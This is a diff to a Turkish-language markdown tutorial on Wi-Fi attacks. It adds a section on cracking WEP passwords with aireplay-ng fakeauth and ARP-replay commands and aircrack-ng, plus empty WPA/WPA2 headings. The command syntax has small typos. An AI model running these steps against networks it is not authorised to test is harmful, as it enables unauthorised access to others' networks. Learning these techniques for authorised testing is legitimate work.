@@ -11,7 +11,12 @@
   - [Ağdaki Cihazlara Deauth Saldırısı Yapma](#Ağdaki-Cihazlara-Deauth-Saldırısı-Yapma)
     - [Ağdaki Bütün Cihazlara Saldırı](#Ağdaki-Bütün-Cihazlara-Saldırı)
     - [Ağdaki Belirli Cihaza Saldırı](#Ağdaki-Belirli-Cihaza-Saldırı)
-
+- [5-Wifi Parola Kırma](#5-Wifi-Parola-Kırma)
+  - [WEB Parola Kırma](#WEB-Parola-Kırma)
+  - [VPA ve VPA2 Parola Kırma](#VPA-ve-VPA2-Parola-Kırma)
+    - [Handshake Yakalama](#Handshake-Yakalama)
+    - [Wordlist Oluşturma](#Wordlist-Oluşturma)
+    - [Parola Kırma](#Parola-Kırma)
 
 
 
@@ -113,3 +118,28 @@ aireplay -ng --deauth A -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
 * -a:  Ağın MAC adresi
 * -c:  Saldırı Yapılacak Cihazın MAC adresi
 ```
+
+# 5-Wifi Parola Kırma 
+
+### WEB Parola Kırma 
+
+Fakeauth saldırısı yapıyoruz ağdan birisi düşüp tekrar bağlanırsa handshake yakalamamız kolaylaşır
+
+```aireplay -ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h YY:YY:YY:YY:YY:YY wlan0mon```
+
+```aireplay -ng --arpreplay -b XX:XX:XX:XX:XX:xX -h YY:YY:YY:YY:YY:YY wlan0mon``` belirlenen cihaza IV yollamamızı sağlar
+
+Eğer Ağda Yeteri Kadar Cihaz Yoksa
+* fakeauuth yolla
+* arpreplay çalıştır
+* aircrack -ng çalıştır
+
+```aircrack -ng airodumptest.cap (Tarama Sırasında Yazdırdığımız Dosya)``` 
+
+```**192.168.1.1** modeminizin ara yüzüne giriş yaparsınız```
+
+### VPA ve VPA2 Parola Kırma
+
+> ### Handshake Yakalama
+> ### Wordlist Oluşturma
+> ### Parola Kırma
